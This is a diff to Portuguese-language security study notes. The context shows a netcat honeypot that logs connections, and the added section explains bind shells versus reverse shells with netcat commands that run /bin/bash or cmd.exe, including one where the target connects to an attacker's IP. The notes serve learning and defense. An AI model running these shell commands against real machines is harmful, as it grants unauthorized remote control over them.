@@ -50,3 +50,17 @@ Para criar um honepote, podemos por exemplo criar um **banner** em *.txt*, exemp
 Agora aprimos a porta com `nc -vnlp {porta} < banner.txt` assim direcionamos a saida ao arquvio de banner criado, exibidno por exemplo o banner de um servidor FTP com informacoes falsas do nosso sistema. O seguinte precisamos direcionar para o *.log* usando agora `nc -vnlp {porta} < banner.txt >> file.log 2>> file.log`,  importante usador dois *sinais de maior que* para gravar no final do arquivo e nao substituir. Outro ponto sobre, e que usando `2>>` direcionamos tambem erros para um arquivo de log e gravamos no final estes. Dessa forma as tentativas de interacao com o honeypot ficam armazenadas, ainda podemos melhorar o script com `while true; do nc -vnlp {porta} < banner.txt >> file.log 2>> file.log;echo $(date) >> file.log;done` trazendo tambem a data e hora do que foi escrito no shell, e adicionado o *while true;do* impede que abrindo a primeiro conexao o netcat caia apos a primeira conexao ser encerrada.
 
 Usos desse honeypot seria por exemplo filtrar os IPs que se conectam as portas falsas e incluir em uma regra de bloqueio de firewall.
+
+## Bind shell X Reverse shell
+
+- **Bind shell** -> Maquina atacante conecta diretamente na porta do alvo, ao conectar **executa** a shell.
+
+Usando netcat, temos a opcao `-e` que permite a execucao de um programa apos a conexao estabelecida.
+Na maquina alvo abrimos uma porta `nc -vnlp {porta} -e /bin/bash` no caso de linux ou `nc -vnlp {porta} -e cmd.exe` para windows.
+Na maquina atacante usamos `nc -vn {ip alvo} {porta}` e ja temos um shell, podemos digitar comandos diretamente no terminal.
+
+
+
+- **Reverse shell** -> Maquina atacante fica esperando uma conexao, maquina alvo conecta e **envia** a shell
+
+No reverse shell, iniciamos com a **maquina do atacante** escutando em uma porta exemplo `nc -vnlp {porta}` e entao na **maquina alvo**  `nc -vn {ip do atacante} {porta} -e cmd.exe # ou /bin/bash para linux` aqui nos conectamos na maquina atacante e enviamos o shell para ela.
